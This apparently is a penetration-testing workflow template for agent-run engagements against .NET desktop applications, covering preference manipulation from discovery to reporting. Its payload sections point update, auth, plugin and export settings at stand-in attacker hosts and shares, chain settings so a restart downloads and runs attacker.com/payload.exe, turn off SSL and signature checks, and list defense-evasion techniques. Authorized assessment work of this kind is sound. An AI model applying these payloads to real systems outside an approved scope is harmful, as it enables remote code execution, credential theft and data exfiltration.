# .NET Preference Manipulation Attack Workflow

> **Template Version:** 1.0
> **Derived From:** Historical engagements
> **Purpose:** Assessment of preference and configuration changes in desktop applications

Use this workflow to assess application preferences and configuration paths. Connect input changes to the resulting privileged operations.

Use command examples in an operator analysis workspace.
During governed agent work, use existing phase directories under `.bra/artifacts/`.
Store finding records in `layer3-engagement/NOTES/FINDINGS.md`.
Replace example targets with the approved scope values.

---

## Pipeline Overview

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   Intel     │ → │  Injection   │ → │   Impact    │ → │  Reporting  │
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
      │                  │                  │                  │
  Find prefs       Craft payload      Chain effects      Document
```

---

## Attack Pattern Overview

Preference manipulation attacks exploit applications that:
1. Store configuration in accessible locations (registry, files, databases)
2. Provide scripting/command interfaces that can modify preferences
3. Consume preference values without validation
4. Perform privileged actions based on preference state

**Common Impact:**
- Arbitrary code execution (via download URLs, plugin paths)
- Credential theft (redirect auth to attacker server)
- Data exfiltration (modify logging/export paths)
- Privilege escalation (enable debug/admin modes)

---

## Stage 1: Preference Discovery

### Locate Configuration Storage
```bash
# Windows Registry
reg query "HKCU\Software\<Vendor>" /s
reg query "HKLM\Software\<Vendor>" /s

# Common file locations
dir /s "%APPDATA%\<Vendor>\*.ini"
dir /s "%APPDATA%\<Vendor>\*.xml"
dir /s "%APPDATA%\<Vendor>\*.json"
dir /s "%APPDATA%\<Vendor>\*.config"
dir /s "%APPDATA%\<Vendor>\*.db"
dir /s "%APPDATA%\<Vendor>\*.sqlite"

# .NET config files
dir /s "%PROGRAMFILES%\<App>\*.exe.config"
dir /s "%PROGRAMFILES%\<App>\app.config"
```

### Dynamic Discovery (Process Monitor)
```
Process Monitor Filters:
- Process Name: <app>.exe
- Operation: RegQueryValue, RegSetValue
- Operation: CreateFile, WriteFile (*.ini, *.xml, *.json)
- Result: SUCCESS
```

### Static Analysis for Preference Keys
```csharp
// Search patterns in decompiled code
// dnSpy/ILSpy search for:
"GetValue"
"SetValue"
"Properties.Settings"
"ConfigurationManager"
"Registry.GetValue"
"IniRead"
"XmlDocument.Load"
```

### Key Categories to Identify
| Category | Security Risk | Example Keys |
|----------|---------------|--------------|
| Update URLs | Code execution | `UpdateServer`, `DownloadUrl`, `CdnBase` |
| Plugin paths | Code execution | `PluginDir`, `ExtensionsPath`, `ModulesPath` |
| Auth endpoints | Credential theft | `AuthServer`, `LoginUrl`, `TokenEndpoint` |
| Proxy settings | MitM | `ProxyHost`, `ProxyPort`, `ProxyBypass` |
| Debug flags | Info disclosure | `DebugMode`, `Verbose`, `LogLevel` |
| Feature flags | Bypass controls | `SkipValidation`, `AllowUnsigned`, `TestMode` |

### Deliverable
- [ ] `preference-map.md` - All discoverable preference keys
- [ ] `storage-locations.md` - Where preferences are stored

---

## Stage 2: Injection Vector Identification

### UI-Based Injection
```
Test all user-accessible settings dialogs:
- Options/Preferences menus
- Import/Export functionality
- Advanced/Hidden settings (registry editors, config files)
- URL scheme handlers
```

### Script/Command Injection
```javascript
// If app exposes scripting interface
// Test command URLs, JavaScript bridges, protocol handlers

// Example: Custom protocol handlers
<protocol>://command/SetPref?key=value

// Example: JavaScript bridge
window.app.setPreference("key", "value");

// Example: Command-line
app.exe --set-pref key=value
```

### File-Based Injection
```
Test import functionality:
- Configuration imports (.ini, .xml, .json)
- Favorites/bookmarks import
- Profile import
- Plugin/extension installation
```

### Network-Based Injection (if applicable)
```
Test for:
- Config sync from remote server
- Auto-update config fetching
- Remote management interfaces
```

### Deliverable
- [ ] `injection-vectors.md` - All identified injection methods

---

## Stage 3: Payload Development

### URL Preference Payloads
```javascript
// Redirect download/update URL
SetPref("UpdateServer", "http://attacker.com/payload/")
SetPref("CdnBase", "http://attacker.com/")

// Redirect authentication
SetPref("AuthEndpoint", "http://attacker.com/capture")
SetPref("LoginUrl", "http://attacker.com/phish")
```

### Path Preference Payloads
```javascript
// Plugin injection
SetPref("PluginPath", "\\\\attacker\\share\\plugins")
SetPref("ExtensionDir", "C:\\Temp\\malicious")

// Log/export redirection
SetPref("LogPath", "\\\\attacker\\share\\logs")
SetPref("ExportDir", "\\\\attacker\\share\\exfil")
```

### Flag Preference Payloads
```javascript
// Enable debug/test modes
SetPref("DebugMode", "true")
SetPref("TestConfig.Enabled", "true")
SetPref("SkipSignatureCheck", "true")

// Disable security features
SetPref("VerifySSL", "false")
SetPref("CheckCertificates", "false")
SetPref("RequireAuth", "false")
```

### Chained Payloads
```javascript
// Example: Force update from attacker server
SetPref("TestConfig.NetInstallUrl", "http://attacker.com/payload.exe")
SetPref("TestConfig.ForceNetInstall", "true")
SetPref("TestConfig.PauseBeforeRun", "false")
// Result: App restart triggers download and execution
```

### Deliverable
- [ ] `payloads/` - Tested payload files

---

## Stage 4: Exploitation

### Pre-Exploitation Checklist
- [ ] Identified high-value preference keys
- [ ] Confirmed injection vector works
- [ ] Payload prepared and hosted (if applicable)
- [ ] Monitoring in place (Procmon, Wireshark)

### Execution Steps

#### For URL Preference Attacks
```bash
# 1. Start listener
python3 -m http.server 8080

# 2. Inject preference
# (via identified vector)

# 3. Trigger action (restart app, click update, etc.)

# 4. Verify connection/download
# Check listener logs
```

#### For Path Preference Attacks
```bash
# 1. Set up SMB share (or local path)
impacket-smbserver share /path/to/malicious

# 2. Inject preference pointing to share

# 3. Trigger plugin/extension load

# 4. Verify execution
# Check SMB logs or execution artifacts
```

#### For Flag Preference Attacks
```bash
# 1. Inject flag change

# 2. Observe new behavior
# - Debug output visible?
# - Security bypass confirmed?
# - New functionality exposed?
```

### Deliverable
- [ ] `poc-script.md` - Reproducible proof of concept
- [ ] Screenshots/recordings of exploitation

---

## Stage 5: Impact Assessment

### Code Execution Assessment
````markdown
## Impact: Remote Code Execution via [Vector]

**Attack Requirements:**
- User interaction: [None/Click/Open file/etc.]
- Persistence: [Survives restart: Yes/No]
- Payload requirements: [Signed/Unsigned/etc.]

**Attack Chain:**
1. [Step 1]
2. [Step 2]
3. [Result]

**Limitations:**
- [Any restrictions on payload]
```

### Data Access Assessment
````markdown
## Impact: Arbitrary File Read via [Vector]

**Accessible Scope:**
- [ ] User files (Documents, Desktop)
- [ ] System files (limited by permissions)
- [ ] Credential stores
- [ ] Other application data

**Exfiltration Method:**
[How data leaves the system]
```

### Privilege Assessment
````markdown
## Current Context
- User: [Domain\User or LocalSystem]
- Integrity Level: [Medium/High/System]
- App runs as: [Same as user/Elevated/Service]

## Escalation Possible
- [ ] User → Admin
- [ ] User → SYSTEM
- [ ] Cross-user access
``````

### Deliverable
- [ ] `impact-assessment.md` - Full impact documentation

---

## Stage 6: Reporting

### Finding Template
````markdown
## Finding: Preference Manipulation leads to [Impact]

**Severity:** Critical/High/Medium
**CVSS:** [Score]
**CWE:** CWE-15 (External Control of System or Configuration Setting)

### Summary
[One paragraph description]

### Affected Component
- Application: [Name and Version]
- Preference Key: [Key name]
- Storage: [Registry/File/Database path]

### Attack Vector
[How the preference can be modified]

### Proof of Concept

**Step 1:** [Setup]
**Step 2:** [Injection]
**Step 3:** [Trigger]
**Step 4:** [Result]

```
[Code/commands]
```

### Impact
[What an attacker can achieve]

### Remediation
1. Validate preference values before use
2. Restrict preference modification to privileged contexts
3. Sign/encrypt sensitive configuration values
4. Implement allowlists for URL/path preferences
````

### Deliverable
- [ ] `preference-attack-report.md` - Complete finding report

---

## Quick Reference

### Common Vulnerable Patterns
| Pattern | Risk | Check |
|---------|------|-------|
| URL in config used for download | RCE | Modify → watch for request |
| Path in config used for load | RCE | Modify → watch for load |
| Flag enables debug/test mode | Info leak | Enable → observe new output |
| Auth URL in config | Cred theft | Modify → capture request |

### Defense Evasion
| Technique | Purpose |
|-----------|---------|
| Multiple vectors | Bypass single-point fixes |
| Chained preferences | Require multiple values for effect |
| Delayed trigger | Preference takes effect on restart |
| Encoding/obfuscation | Bypass input validation |

### CWE References
| CWE | Description |
|-----|-------------|
| CWE-15 | External Control of System or Configuration Setting |
| CWE-426 | Untrusted Search Path |
| CWE-427 | Uncontrolled Search Path Element |
| CWE-494 | Download of Code Without Integrity Check |
| CWE-829 | Inclusion of Functionality from Untrusted Control Sphere |

---

## Checklist

- [ ] Preference storage locations identified
- [ ] All preference keys mapped
- [ ] Injection vectors identified
- [ ] High-value preferences tested
- [ ] Payloads developed
- [ ] Impact assessed
- [ ] PoC documented
- [ ] Report generated
